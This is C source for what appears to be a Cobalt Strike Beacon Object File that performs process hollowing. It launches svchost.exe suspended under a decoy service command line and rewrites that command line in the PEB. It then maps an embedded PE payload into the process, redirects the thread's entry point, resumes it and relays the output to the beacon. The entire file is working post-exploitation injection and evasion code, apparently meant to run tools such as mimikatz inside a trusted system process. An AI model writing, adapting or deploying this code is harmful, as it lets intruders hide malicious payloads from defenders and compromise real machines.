#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <stddef.h> 

#include "shellcode.h"
#include "beacon.h"
#include "definitions.h"


#define MAX_NUM(a, b) a > b ? a : b;
#define MIN_NUM(a, b) a < b ? a : b;
#define MAX_INDIVIDUAL_CMDLINE_ARG_LEN 1000

void ZeroMemoryCustom(BYTE* pAddress, DWORD dwSize) {
    MSVCRT$memset(pAddress, 0, dwSize);
}

void StrCat(PCHAR destination, PCHAR source, DWORD sourceLenMax) {
    DWORD sourceLenToCopy = MIN_NUM(MSVCRT$strlen(source), sourceLenMax);
    DWORD destinationLen = MSVCRT$strlen(destination);
    for (DWORD i = 0; i < sourceLenToCopy; i++) {
        destination[destinationLen + i] = source[i];
    }
}

DWORD64 LoadShellcodeIntoMemory(OUT VOID** ppShellcodeStorage) {
    *ppShellcodeStorage = KERNEL32$VirtualAlloc(NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (*ppShellcodeStorage == NULL) {
        BeaconPrintf(CALLBACK_ERROR,"VirtualAlloc failed: %lu", KERNEL32$GetLastError());
        return 0;
    }
    MSVCRT$memcpy(*ppShellcodeStorage, shellcode, sizeof(shellcode));
    return sizeof(shellcode);
}

BOOL AdjustMemoryProtections(IN HANDLE hTargetProc, IN ULONG_PTR uBaseAddr, IN PIMAGE_NT_HEADERS pNtHeaders, IN PIMAGE_SECTION_HEADER pSectionHeaders) {

    for (DWORD nSectionIndex = 0; nSectionIndex < pNtHeaders->FileHeader.NumberOfSections; nSectionIndex++) {
        DWORD dwNewProtect = 0, dwOldProtect = 0;

        if (!pSectionHeaders[nSectionIndex].SizeOfRawData || !pSectionHeaders[nSectionIndex].VirtualAddress)
            continue;

        if (pSectionHeaders[nSectionIndex].Characteristics & IMAGE_SCN_MEM_WRITE)
            dwNewProtect = PAGE_WRITECOPY;

        if (pSectionHeaders[nSectionIndex].Characteristics & IMAGE_SCN_MEM_READ)
            dwNewProtect = PAGE_READONLY;

        if ((pSectionHeaders[nSectionIndex].Characteristics & IMAGE_SCN_MEM_WRITE) &&
            (pSectionHeaders[nSectionIndex].Characteristics & IMAGE_SCN_MEM_READ))
            dwNewProtect = PAGE_READWRITE;

        if (pSectionHeaders[nSectionIndex].Characteristics & IMAGE_SCN_MEM_EXECUTE)
            dwNewProtect = PAGE_EXECUTE;

        if ((pSectionHeaders[nSectionIndex].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
            (pSectionHeaders[nSectionIndex].Characteristics & IMAGE_SCN_MEM_WRITE))
            dwNewProtect = PAGE_EXECUTE_WRITECOPY;

        if ((pSectionHeaders[nSectionIndex].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
            (pSectionHeaders[nSectionIndex].Characteristics & IMAGE_SCN_MEM_READ))
            dwNewProtect = PAGE_EXECUTE_READ;

        if ((pSectionHeaders[nSectionIndex].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
            (pSectionHeaders[nSectionIndex].Characteristics & IMAGE_SCN_MEM_WRITE) &&
            (pSectionHeaders[nSectionIndex].Characteristics & IMAGE_SCN_MEM_READ))
            dwNewProtect = PAGE_EXECUTE_READWRITE;

        if (!KERNEL32$VirtualProtectEx(hTargetProc, (PVOID)(uBaseAddr + pSectionHeaders[nSectionIndex].VirtualAddress),
            pSectionHeaders[nSectionIndex].SizeOfRawData, dwNewProtect, &dwOldProtect)) {
            BeaconPrintf(CALLBACK_ERROR,"VirtualProtectEx, error: %lu", KERNEL32$GetLastError());
            return FALSE;
        }
    }
    return TRUE;
}

VOID DisplayProcessOutput(IN HANDLE hOutputPipe) {
    DWORD dwBytesAvailable = 0;
    BYTE* pOutputData = NULL;
    
    // Check if there's data to read without removing it
    if (KERNEL32$PeekNamedPipe(hOutputPipe, NULL, 0, NULL, &dwBytesAvailable, NULL) && dwBytesAvailable > 0) {
        pOutputData = (BYTE*)KERNEL32$LocalAlloc(LPTR, dwBytesAvailable + 1);
        if (!pOutputData) return;

        DWORD dwBytesRead = 0;
        if (KERNEL32$ReadFile(hOutputPipe, pOutputData, dwBytesAvailable, &dwBytesRead, NULL)) {
            if (dwBytesRead > 0) {
                pOutputData[dwBytesRead] = '\0';
                BeaconPrintf(CALLBACK_OUTPUT, "%.*s", dwBytesRead, pOutputData);
    
            }
        }
        KERNEL32$LocalFree(pOutputData);
    }
}

typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

BOOL SpawnSuspendedProcess(IN LPCSTR szProcessPath, IN OPTIONAL LPCSTR szArguments,
    OUT PPROCESS_INFORMATION pProcInfo, OUT HANDLE* phInputPipe, OUT HANDLE* phOutputPipe) {

    STARTUPINFOA stStartupInfo = { 0 };
    SECURITY_ATTRIBUTES saSecurity = { 0 };
    HANDLE hInputRead = NULL, hInputWrite = NULL, hOutputRead = NULL, hOutputWrite = NULL;
    LPSTR szFakeCommandLine = NULL;
    LPSTR szRealCommandLine = NULL;
    BOOL bResult = FALSE;

    ZeroMemoryCustom((BYTE*)pProcInfo, sizeof(PROCESS_INFORMATION));
    ZeroMemoryCustom((BYTE*)&stStartupInfo, sizeof(STARTUPINFOA));
    ZeroMemoryCustom((BYTE*)&saSecurity, sizeof(SECURITY_ATTRIBUTES));

    saSecurity.nLength = sizeof(SECURITY_ATTRIBUTES);
    saSecurity.bInheritHandle = TRUE;

    if (!KERNEL32$CreatePipe(&hInputRead, &hInputWrite, &saSecurity, 0)) {
        BeaconPrintf(CALLBACK_ERROR, "CreatePipe[1], error: %lu", KERNEL32$GetLastError());
        goto CLEANUP;
    }

    if (!KERNEL32$CreatePipe(&hOutputRead, &hOutputWrite, &saSecurity, 0)) {
        BeaconPrintf(CALLBACK_ERROR, "CreatePipe[2], error: %lu", KERNEL32$GetLastError());
        goto CLEANUP;
    }

    stStartupInfo.cb = sizeof(STARTUPINFOA);
    stStartupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    stStartupInfo.wShowWindow = SW_HIDE;
    stStartupInfo.hStdInput = hInputRead;
    stStartupInfo.hStdOutput = stStartupInfo.hStdError = hOutputWrite;

    // Build fake command line (benign looking)
    char szFakeArgs[] = " -k LocalServiceNetworkRestricted";

    size_t fakeBufferSize = MSVCRT$strlen(szProcessPath) + MSVCRT$strlen(szFakeArgs) + 1;
    szFakeCommandLine = (LPSTR)KERNEL32$LocalAlloc(LPTR, fakeBufferSize);
    if (!szFakeCommandLine) {
        BeaconPrintf(CALLBACK_ERROR, "LocalAlloc failed for fake command line: %lu", KERNEL32$GetLastError());
        goto CLEANUP;
    }
    MSVCRT$_snprintf(szFakeCommandLine, fakeBufferSize, "%s%s", szProcessPath, szFakeArgs);

    // Build real command line
    size_t realBufferSize = MSVCRT$strlen(szProcessPath) + (szArguments ? MSVCRT$strlen(szArguments) + 1 : 0) + 1;
    szRealCommandLine = (LPSTR)KERNEL32$LocalAlloc(LPTR, realBufferSize);
    if (!szRealCommandLine) {
        BeaconPrintf(CALLBACK_ERROR, "Locaed: %lu", KERNEL32$GetLastError());
        goto CLEANUP;
    }
    if (szArguments) {
        MSVCRT$_snprintf(szRealCommandLine, realBufferSize, "%s %s", szProcessPath, szArguments);
    } else {
        MSVCRT$_snprintf(szRealCommandLine, realBufferSize, "%s", szProcessPath);
    }
    

    // Create process with fake arguments using CreateProcessA
    if (!KERNEL32$CreateProcessA(NULL, szFakeCommandLine, NULL, NULL, TRUE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW | CREATE_NEW_CONSOLE, NULL, NULL, &stStartupInfo, pProcInfo)) {
        BeaconPrintf(CALLBACK_ERROR, "CreateProcessA failed: %lu", KERNEL32$GetLastError());
        goto CLEANUP;
    }

    // Spoof the command line in PEB
    PROCESS_BASIC_INFORMATION pbi = { 0 };
    PEB peb = { 0 };
    RTL_USER_PROCESS_PARAMETERS parameters = { 0 };

    // Get NtQueryInformationProcess
    fnNtQueryInformationProcess pNtQueryInformationProcess = (fnNtQueryInformationProcess)KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
    if (pNtQueryInformationProcess == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to get NtQueryInformationProcess address: %lu", KERNEL32$GetLastError());
        goto CLEANUP;
    }

    // Query process information
    NTSTATUS status = pNtQueryInformationProcess(pProcInfo->hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL);
    if (status != 0) {
        BeaconPrintf(CALLBACK_ERROR, "NtQueryInformationProcess failed: 0x%lx", status);
        goto CLEANUP;
    }

    // Read PEB
    SIZE_T bytesRead = 0;
    if (!KERNEL32$ReadProcessMemory(pProcInfo->hProcess, pbi.PebBaseAddress, &peb, sizeof(PEB), &bytesRead)) {
        BeaconPrintf(CALLBACK_ERROR, "ReadProcessMemory (PEB) failed: %lu", KERNEL32$GetLastError());
        goto CLEANUP;
    }

    // Read process parameters
    if (!KERNEL32$ReadProcessMemory(pProcInfo->hProcess, peb.ProcessParameters, &parameters, sizeof(RTL_USER_PROCESS_PARAMETERS), &bytesRead)) {
        BeaconPrintf(CALLBACK_ERROR, "ReadProcessMemory (ProcessParameters) failed: %lu", KERNEL32$GetLastError());
        goto CLEANUP;
    }


    // Convert real command line to wide string (PEB uses Unicode)
    int wideRealCmdLineLen = KERNEL32$MultiByteToWideChar(CP_ACP, 0, szRealCommandLine, -1, NULL, 0);
    if (wideRealCmdLineLen == 0) {
        BeaconPrintf(CALLBACK_ERROR, "MultiByteToWideChar (get length) failed: %lu", KERNEL32$GetLastError());
        goto CLEANUP;
    }

    LPWSTR wideRealCommandLine = (LPWSTR)KERNEL32$LocalAlloc(LPTR, wideRealCmdLineLen * sizeof(WCHAR));
    if (!wideRealCommandLine) {
        BeaconPrintf(CALLBACK_ERROR, "LocalAlloc for wide real command line failed: %lu", KERNEL32$GetLastError());
        goto CLEANUP;
    }

    if (KERNEL32$MultiByteToWideChar(CP_ACP, 0, szRealCommandLine, -1, wideRealCommandLine, wideRealCmdLineLen) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "MultiByteToWideChar failed: %lu", KERNEL32$GetLastError());
        KERNEL32$LocalFree(wideRealCommandLine);
        goto CLEANUP;
    }

    // Write real command line to process memory
    SIZE_T bytesWritten = 0;
    if (!KERNEL32$WriteProcessMemory(pProcInfo->hProcess, parameters.CommandLine.Buffer, wideRealCommandLine, 
        wideRealCmdLineLen * sizeof(WCHAR), &bytesWritten)) {
        BeaconPrintf(CALLBACK_ERROR, "WriteProcessMemory (CommandLine) failed: %lu", KERNEL32$GetLastError());
        KERNEL32$LocalFree(wideRealCommandLine);
        goto CLEANUP;
    }

    // Update command line length
    USHORT newLength = (USHORT)((wideRealCmdLineLen - 1) * sizeof(WCHAR));
    if (!KERNEL32$WriteProcessMemory(pProcInfo->hProcess, 
        (PBYTE)peb.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length),
        &newLength, sizeof(USHORT), &bytesWritten)) {
        BeaconPrintf(CALLBACK_ERROR, "WriteProcessMemory (CommandLine.Length) failed: %lu", KERNEL32$GetLastError());
    }


    KERNEL32$LocalFree(wideRealCommandLine);

    *phInputPipe = hInputWrite;
    *phOutputPipe = hOutputRead;
    bResult = TRUE;

    BeaconPrintf(CALLBACK_OUTPUT, "Process created with spoofed command line");

CLEANUP:
    if (szFakeCommandLine) KERNEL32$LocalFree(szFakeCommandLine);
    if (szRealCommandLine) KERNEL32$LocalFree(szRealCommandLine);
    if (hInputRead) KERNEL32$CloseHandle(hInputRead);
    if (hOutputWrite) KERNEL32$CloseHandle(hOutputWrite);

    if (!bResult) {
        // Cleanup on failure
        if (pProcInfo->hProcess) {
            KERNEL32$TerminateProcess(pProcInfo->hProcess, 0);
            KERNEL32$CloseHandle(pProcInfo->hProcess);
        }
        if (pProcInfo->hThread)KERNEL32$CloseHandle(pProcInfo->hThread);
        ZeroMemoryCustom((BYTE*)pProcInfo, sizeof(PROCESS_INFORMATION));
    }

    return bResult;
}



BOOL UpdateRemoteImageBase(IN HANDLE hProcess, IN ULONG_PTR uNewBaseAddr, IN ULONG_PTR uPebOffset) {
#ifdef _WIN64
    ULONG_PTR uPebImageBaseField = uPebOffset + offsetof(PEB, Reserved3[1]);
#else
    ULONG_PTR uPebImageBaseField = uPebOffset + 0x8;
#endif
    SIZE_T dwBytesWritten = 0;

    if (!KERNEL32$WriteProcessMemory(hProcess, (PVOID)uPebImageBaseField, &uNewBaseAddr,
        sizeof(ULONG_PTR), &dwBytesWritten) || dwBytesWritten != sizeof(ULONG_PTR)) {
        BeaconPrintf(CALLBACK_ERROR,"WriteProcessMemory, error: %lu", KERNEL32$GetLastError());
        return FALSE;
    }
    return TRUE;
}

BOOL DeployPayload(IN BYTE* pPayloadData, IN LPCSTR szTargetPath, IN OPTIONAL LPCSTR szCmdArgs) {

    if (!pPayloadData || !szTargetPath) return FALSE;

    PROCESS_INFORMATION stProcInfo = { 0 };
    CONTEXT ctxThread = { .ContextFlags = CONTEXT_ALL };
    HANDLE hInputPipe = NULL, hOutputPipe = NULL;
    BYTE* pRemoteMem = NULL;
    PIMAGE_NT_HEADERS pNtHeaders = NULL;
    PIMAGE_SECTION_HEADER pSections = NULL;
    SIZE_T dwBytesWritten = 0;
    BOOL bSuccess = FALSE;

    if (!SpawnSuspendedProcess(szTargetPath, szCmdArgs, &stProcInfo, &hInputPipe, &hOutputPipe))
        goto CLEANUP;

    pNtHeaders = (PIMAGE_NT_HEADERS)(pPayloadData + ((PIMAGE_DOS_HEADER)pPayloadData)->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        BeaconPrintf(CALLBACK_ERROR,"[!] Invalid NT headers\n, error: %lu", KERNEL32$GetLastError());
        goto CLEANUP;
    }

    pRemoteMem = (BYTE*)KERNEL32$VirtualAllocEx(stProcInfo.hProcess, (PVOID)pNtHeaders->OptionalHeader.ImageBase,
        pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteMem) {
        BeaconPrintf(CALLBACK_ERROR,"VirtualAllocEx, error: %lu", KERNEL32$GetLastError());
        goto CLEANUP;
    }

    if (pRemoteMem != (BYTE*)pNtHeaders->OptionalHeader.ImageBase) {
        BeaconPrintf(CALLBACK_ERROR,"[!] Relocation required (unsupported)\n, error: %lu", KERNEL32$GetLastError());
        goto CLEANUP;
    }

    if (!KERNEL32$WriteProcessMemory(stProcInfo.hProcess, pRemoteMem, pPayloadData,
        pNtHeaders->OptionalHeader.SizeOfHeaders, &dwBytesWritten) ||
        dwBytesWritten != pNtHeaders->OptionalHeader.SizeOfHeaders) {
        BeaconPrintf(CALLBACK_ERROR,"WriteProcessMemory, error: %lu", KERNEL32$GetLastError());
        goto CLEANUP;
    }

    pSections = IMAGE_FIRST_SECTION(pNtHeaders);
    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (!KERNEL32$WriteProcessMemory(stProcInfo.hProcess, pRemoteMem + pSections[i].VirtualAddress,
            pPayloadData + pSections[i].PointerToRawData, pSections[i].SizeOfRawData, &dwBytesWritten) ||
            dwBytesWritten != pSections[i].SizeOfRawData) {
            BeaconPrintf(CALLBACK_ERROR,"WriteProcessMemory, error: %lu", KERNEL32$GetLastError());
            goto CLEANUP;
        }
    }

    if (!KERNEL32$GetThreadContext(stProcInfo.hThread, &ctxThread)) {
        BeaconPrintf(CALLBACK_ERROR,"GetThreadContext, error: %lu", KERNEL32$GetLastError());
        goto CLEANUP;
    }

#ifdef _WIN64
    if (!UpdateRemoteImageBase(stProcInfo.hProcess, (ULONG_PTR)pRemoteMem, ctxThread.Rdx))
#else
    if (!UpdateRemoteImageBase(stProcInfo.hProcess, (ULONG_PTR)pRemoteMem, ctxThread.Ebx))
#endif
    goto CLEANUP;
    
    if (!AdjustMemoryProtections(stProcInfo.hProcess, (ULONG_PTR)pRemoteMem, pNtHeaders, pSections))
        goto CLEANUP;

#ifdef _WIN64
    ctxThread.Rcx = (DWORD64)(pRemoteMem + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
#else
    ctxThread.Ecx = (DWORD)(pRemoteMem + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
#endif

    if (!KERNEL32$SetThreadContext(stProcInfo.hThread, &ctxThread)) {
        BeaconPrintf(CALLBACK_ERROR,"SetThreadContext, error: %lu", KERNEL32$GetLastError());
        goto CLEANUP;
    }

    if (KERNEL32$ResumeThread(stProcInfo.hThread) == (DWORD)-1) {
        BeaconPrintf(CALLBACK_ERROR,"ResumeThread, error: %lu", KERNEL32$GetLastError());
        goto CLEANUP;
    }

    DWORD dwExitCode = STILL_ACTIVE;
    while (TRUE) {
        if (!KERNEL32$GetExitCodeProcess(stProcInfo.hProcess, &dwExitCode)) {
            BeaconPrintf(CALLBACK_ERROR, "GetExitCodeProcess failed: %lu", KERNEL32$GetLastError());
            break;
        }
        if (dwExitCode != STILL_ACTIVE) break;

        DisplayProcessOutput(hOutputPipe);
        KERNEL32$Sleep(100);
    }

    DisplayProcessOutput(hOutputPipe);

    bSuccess = TRUE;

CLEANUP:
    if (hInputPipe) KERNEL32$CloseHandle(hInputPipe);
    if (hOutputPipe) KERNEL32$CloseHandle(hOutputPipe);
    if (stProcInfo.hProcess) KERNEL32$CloseHandle(stProcInfo.hProcess);
    if (stProcInfo.hThread) KERNEL32$CloseHandle(stProcInfo.hThread);
    return bSuccess;
}

#define TARGET_APP_PATH "C:\\Windows\\System32\\svchost.exe"

void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
 
    char peArgs[2048] = {0};
 
    int argCount = 0;
    char *currentArg;
 
    currentArg = BeaconDataExtract(&parser, NULL);
 
    if (currentArg == NULL || currentArg[0] == '\0') {
        // Default behaviour
        MSVCRT$strcpy(peArgs, "coffee exit");
        BeaconPrintf(CALLBACK_OUTPUT, "Using default arguments: %s", peArgs);
    } else {
        MSVCRT$strcpy(peArgs, currentArg);
        argCount++;
 
        // Aditional args
        while ((currentArg = BeaconDataExtract(&parser, NULL)) != NULL) {
            // Parse quotes
            if (MSVCRT$strchr(currentArg, ' ') != NULL) {
                MSVCRT$strcat(peArgs, " \"");
                MSVCRT$strcat(peArgs, currentArg);
                MSVCRT$strcat(peArgs, "\"");
            } else {
                MSVCRT$strcat(peArgs, " ");
                MSVCRT$strcat(peArgs, currentArg);
            }
            argCount++;
        }
 
        // Add exit at the end
        MSVCRT$strcat(peArgs, " exit");
        BeaconPrintf(CALLBACK_OUTPUT, "Using %d arguments: %s", argCount, peArgs);
    }
 
    // Load Shellcode
    BYTE* pPayloadData = NULL;
    if (!LoadShellcodeIntoMemory((VOID**)&pPayloadData)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to load shellcode");
        return;
    }
 
    // Run PE Hollowing
    if (!DeployPayload(pPayloadData, TARGET_APP_PATH, peArgs)) {
        BeaconPrintf(CALLBACK_ERROR, "Payload deployment failed");
    }
}